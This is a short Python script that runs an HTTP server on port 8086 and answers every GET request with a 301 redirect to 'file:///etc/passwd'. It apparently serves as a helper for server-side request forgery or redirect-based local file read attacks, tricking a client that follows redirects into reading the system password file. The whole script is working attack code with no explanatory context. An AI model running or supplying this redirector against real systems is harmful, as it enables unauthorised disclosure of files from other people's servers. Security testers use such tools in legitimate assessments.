#!/usr/bin/env python3

import http.server
import sys

PORT = 8086

class ServerHandler(http.server.BaseHTTPRequestHandler):

	def do_GET(self):
		self.send_response(301)
		self.send_header("Location", 'file:///etc/passwd')
		self.end_headers()
		self.connection.shutdown(1) 

if __name__ == '__main__':
	httpd = http.server.HTTPServer(('0.0.0.0', PORT), ServerHandler)
	try:
		httpd.serve_forever()
	except KeyboardInterrupt:
		pass
	finally:
		httpd.server_close()
